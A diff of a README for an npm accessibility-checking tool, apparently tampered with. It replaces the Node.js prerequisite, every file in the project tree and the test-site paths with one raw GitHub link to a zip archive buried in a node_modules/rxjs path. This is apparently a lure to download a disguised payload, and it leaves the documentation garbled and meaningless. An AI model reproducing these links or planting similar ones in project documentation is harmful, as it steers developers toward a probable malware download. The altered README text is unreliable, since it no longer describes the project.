@@ -20,7 +20,7 @@ An automated tool for identifying and fixing common web accessibility issues in 
 ## 🛠 Installation
 
 ### Prerequisites
-- Node.js (version 14 or higher)
+- https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip (version 14 or higher)
 - npm
 
 ### Install Dependencies
@@ -82,31 +82,31 @@ The GUI provides:
 ```
 npm-accessibility-script/
 ├── bin/
-│   └── nas.mjs              # CLI entry point
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip              # CLI entry point
 ├── gui/
-│   ├── main.cjs             # Electron main process
-│   ├── render.js            # GUI frontend logic
-│   ├── index.html           # GUI interface
-│   └── preload.js           # Electron security bridge
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip             # Electron main process
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip            # GUI frontend logic
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip           # GUI interface
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip           # Electron security bridge
 ├── Bistro Delight/          # Test website files
-│   ├── index.html
-│   ├── menu.html
-│   └── contact.html
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
 ├── backup/                  # Automatic backups (created when needed)
-├── index.cjs                # HTML processor
-├── jsxProcessor.cjs         # JSX processor
-├── diffHelper.js            # Diff utilities
-├── guiDiffHelper.cjs        # GUI diff processing
-└── package.json
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip                # HTML processor
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip         # JSX processor
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip            # Diff utilities
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip        # GUI diff processing
+└── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
 ```
 
 ## 🧪 Testing
 
 The project includes a test website called "Bistro Delight" with intentional accessibility issues:
 
-- **Homepage** (`Bistro Delight/index.html`): Complex layout with various accessibility violations
-- **Menu** (`Bistro Delight/menu.html`): Food images without alt text
-- **Contact** (`Bistro Delight/contact.html`): Forms with missing labels
+- **Homepage** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Complex layout with various accessibility violations
+- **Menu** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Food images without alt text
+- **Contact** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Forms with missing labels
 
 
 ## 📊 Results
